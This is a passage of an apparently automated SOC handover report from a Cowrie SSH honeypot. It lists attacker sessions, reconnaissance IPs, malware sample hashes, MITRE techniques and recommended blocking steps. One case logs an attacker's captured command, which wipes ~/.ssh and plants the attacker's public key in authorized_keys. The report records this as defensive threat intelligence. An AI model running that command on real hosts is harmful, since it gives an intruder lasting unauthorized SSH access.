| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:36:15` | `cowrie.session.connect` |
| `2026-03-27 12:36:15` | `cowrie.client.version` |
| `2026-03-27 12:36:15` | `cowrie.client.kex` |
| `2026-03-27 12:36:15` | `cowrie.login.success` |
| `2026-03-27 12:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.86.18[.]208` to AbuseIPDB if not already reported
- [ ] Block `47.86.18[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbe40137edef

| Field | Detail |
|---|---|
| **Source IP** | `8.222.202[.]6` |
| **First Seen** | 2026-03-27 12:40 |
| **Last Seen** | 2026-03-27 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:40:13` | `cowrie.session.connect` |
| `2026-03-27 12:40:13` | `cowrie.client.version` |
| `2026-03-27 12:40:13` | `cowrie.client.kex` |
| `2026-03-27 12:40:14` | `cowrie.login.success` |
| `2026-03-27 12:40:14` | `cowrie.session.params` |
| `2026-03-27 12:40:14` | `cowrie.command.input` |
| `2026-03-27 12:40:14` | `cowrie.command.failed` |
| `2026-03-27 12:40:14` | `cowrie.log.closed` |
| `2026-03-27 12:40:14` | `cowrie.session.params` |
| `2026-03-27 12:40:14` | `cowrie.command.input` |
| `2026-03-27 12:40:14` | `cowrie.session.file_download` |
| `2026-03-27 12:40:14` | `cowrie.log.closed` |
| `2026-03-27 12:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.202[.]6` to AbuseIPDB if not already reported
- [ ] Block `8.222.202[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5550e516a777

| Field | Detail |
|---|---|
| **Source IP** | `8.222.202[.]6` |
| **First Seen** | 2026-03-27 12:40 |
| **Last Seen** | 2026-03-27 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:40:16` | `cowrie.session.connect` |
| `2026-03-27 12:40:16` | `cowrie.client.version` |
| `2026-03-27 12:40:16` | `cowrie.client.kex` |
| `2026-03-27 12:40:16` | `cowrie.login.success` |
| `2026-03-27 12:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.202[.]6` to AbuseIPDB if not already reported
- [ ] Block `8.222.202[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc89567b415

| Field | Detail |
|---|---|
| **Source IP** | `34.29.104[.]32` |
| **First Seen** | 2026-03-27 12:57 |
| **Last Seen** | 2026-03-27 12:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:57:02` | `cowrie.session.connect` |
| `2026-03-27 12:57:03` | `cowrie.client.version` |
| `2026-03-27 12:57:03` | `cowrie.client.kex` |
| `2026-03-27 12:57:04` | `cowrie.login.success` |
| `2026-03-27 12:57:05` | `cowrie.direct-tcpip.request` |
| `2026-03-27 12:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.29.104[.]32` to AbuseIPDB if not already reported
- [ ] Block `34.29.104[.]32` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efce672cb1e6

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]179` |
| **First Seen** | 2026-03-27 12:57 |
| **Last Seen** | 2026-03-27 12:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 12:57:10` | `cowrie.session.connect` |
| `2026-03-27 12:57:10` | `cowrie.client.version` |
| `2026-03-27 12:57:10` | `cowrie.client.kex` |
| `2026-03-27 12:57:11` | `cowrie.login.success` |
| `2026-03-27 12:57:12` | `cowrie.direct-tcpip.request` |
| `2026-03-27 12:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]179` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.66.128[.]10` | **2** | 2026-03-27 12:34 | 2026-03-27 12:36 | 4m | 0 | `T1592` | 🟢 LOW |
| `187.131.84[.]110` | **2** | 2026-03-27 11:48 | 2026-03-27 11:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-03-27 12:00 | 2026-03-27 12:19 | 2m | 0 | `T1592` | 🟢 LOW |
| `100.55.74[.]138` | 1 | 2026-03-27 12:56 | 2026-03-27 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `112.168.71[.]109` | 1 | 2026-03-27 12:30 | 2026-03-27 12:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.228.195[.]251` | 1 | 2026-03-27 11:47 | 2026-03-27 11:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.112[.]118` | 1 | 2026-03-27 12:29 | 2026-03-27 12:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]147` | 1 | 2026-03-27 11:35 | 2026-03-27 11:35 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-27 12:23 | 2026-03-27 12:23 | 31s | 0 | `T1592` | 🟢 LOW |
| `170.83.126[.]204` | 1 | 2026-03-27 11:57 | 2026-03-27 11:58 | 41s | 0 | `T1592` | 🟢 LOW |
| `177.53.247[.]76` | 1 | 2026-03-27 12:33 | 2026-03-27 12:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]136` | 1 | 2026-03-27 10:45 | 2026-03-27 10:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.227[.]2` | 1 | 2026-03-27 12:29 | 2026-03-27 12:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.73.164[.]228` | 1 | 2026-03-27 11:06 | 2026-03-27 11:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.233.85[.]194` | 1 | 2026-03-27 10:53 | 2026-03-27 10:53 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.218.57[.]50` | 1 | 2026-03-27 11:28 | 2026-03-27 11:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.90.79[.]26` | 1 | 2026-03-27 12:48 | 2026-03-27 12:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.208.181[.]155` | 1 | 2026-03-27 12:50 | 2026-03-27 12:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.139.245[.]137` | 1 | 2026-03-27 11:14 | 2026-03-27 11:14 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.102[.]122` | 1 | 2026-03-27 10:47 | 2026-03-27 10:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.237.10[.]247` | 1 | 2026-03-27 12:34 | 2026-03-27 12:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.86.18[.]208` | 1 | 2026-03-27 12:36 | 2026-03-27 12:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.149[.]55` | 1 | 2026-03-27 10:45 | 2026-03-27 10:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.20.135[.]235` | 1 | 2026-03-27 11:07 | 2026-03-27 11:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.211[.]96` | 1 | 2026-03-27 12:36 | 2026-03-27 12:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.96.237[.]254` | 1 | 2026-03-27 11:37 | 2026-03-27 11:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.222.202[.]6` | 1 | 2026-03-27 12:40 | 2026-03-27 12:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.227.140[.]125` | 1 | 2026-03-27 11:26 | 2026-03-27 11:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `100.55.74[.]138` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 10 |
| `121.66.124[.]147` | KR | LG Uplus | **100** ⚠️ | 41 |
| `222.139.245[.]137` | CN | China Unicom Henan province network | **100** ⚠️ | 39 |
| `27.123.102[.]122` | IN | Bharti Airtel Limited | **100** ⚠️ | 27 |
| `178.178.194[.]136` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 49 |
| `183.233.85[.]194` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `182.73.164[.]228` | IN | KALINGA MEDIA & ENTERTAINMENT PVT. LTD. | **100** ⚠️ | 50 |
| `65.20.135[.]235` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 30 |
| `8.222.202[.]6` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 7 |
| `187.218.57[.]50` | MX | UNINET | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 45 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 80 cases |
| Tool 34  | Credential Extractor        | ✅ 39 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (42.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 15 priority case(s) shown individually · 28 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-27T13:01:41Z_
